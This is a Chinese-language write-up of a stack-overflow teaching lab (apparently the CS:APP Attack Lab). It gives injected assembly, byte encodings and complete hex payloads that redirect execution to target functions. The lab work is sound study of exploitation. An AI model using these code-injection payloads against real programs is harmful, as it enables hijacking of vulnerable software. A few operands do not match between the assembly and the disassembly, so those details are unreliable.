# Attack

Level 1

第一节段是简单的栈溢出，我们需要将构造好的函数写入函数正常的返回地址。

[![cTN5rj.png](https://z3.ax1x.com/2021/04/19/cTN5rj.png)](https://imgtu.com/i/cTN5rj)

因为栈开辟了40个字节大小的空间，所以需要填充40个字节的字符，然后输入需要

返回的地址，这里我们需要跳转的touch1，所以返回地址是4017c0，我们在attack1.txt

里面写入构造的payload。

[![cTNLGT.png](https://z3.ax1x.com/2021/04/19/cTNLGT.png)](https://imgtu.com/i/cTNLGT)

运行，攻击成功。

[![cTUyy4.png](https://z3.ax1x.com/2021/04/19/cTUyy4.png)](https://imgtu.com/i/cTUyy4)

Level 2
[![cTro59.png](https://z3.ax1x.com/2021/04/19/cTro59.png)](https://imgtu.com/i/cTro59)

查看touch2程序的逻辑，这段程序是验证传进来的参数是否和cookie中的值相等，cookie=0x59b997fa。思路是将返回地址设置为注入代码的地址，因为这次是直接在栈顶注入，所以返回地址为%rsp地址，将cookie的值传给第一个参数，调用touch2但又不能使用call和jmp等指令，所以要先吧touch2的地址压入栈再用ret从栈上弹出返回地址。所以注入的代码为

```
movq    $0x59b997fa, %rdi
pushq   0x4017ec
ret
```

需要将上述的汇编代码转化为计算机可以执行的指令序列并执行下列命令：

```
linux> gcc -c inject.s
linux> objdump -d inject.o

Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 69 59    mov    $0x596997fa,%rdi
   7:   68 ec 17 40 00          pushq  $0x4017ec
   c:   c3                      retq

```

得到指令序列为48 c7 c7 fa 97 69 59 68 ec 17 40 00 c3

[![cjvhfP.png](https://z3.ax1x.com/2021/04/24/cjvhfP.png)](https://imgtu.com/i/cjvhfP)

获取到了%rsp的地址构造字符串。

```
48 c7 c7 fa 97 b9 59 68 ec 17 
40 00 c3 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00 
```



Level3

这一阶段需要传递一段字符串作为参数向输入的字符串中注入一段代码。在正常返回的时候跳转到touch3函数。

[![https://ae01.alicdn.com/kf/U6e430299b0954ad6a605c382283e4061x.jpg](https://ae01.alicdn.com/kf/U6e430299b0954ad6a605c382283e4061x.jpg)](https://ae01.alicdn.com/kf/U6e430299b0954ad6a605c382283e4061x.jpg)

程序在touch3函数中调用了hexmatch函数，这个函数的功能是匹配cookie和传进来的字符是否匹配，已经给出了cookie是0x59b997fa，所以应该传入的参数是“59b997fa”。在调用hexmatch函数的时候，如果cookie存在buffer里面可能会被覆盖，所以cookie要放到test栈帧中。我们要注入的代码是。

```
movq    $0x5561dca8, %rdi
pushq   0x4018fa
ret
```

经过转换变位指令序列48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3。cookie的16进制数为35 39 62 39 39 37 66 61 00。构造字符序列为

```
48 c7 c7 a8 dc 61 55 68 fa 18 
40 00 c3 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 35 39
62 39 39 37 66 61 00
```

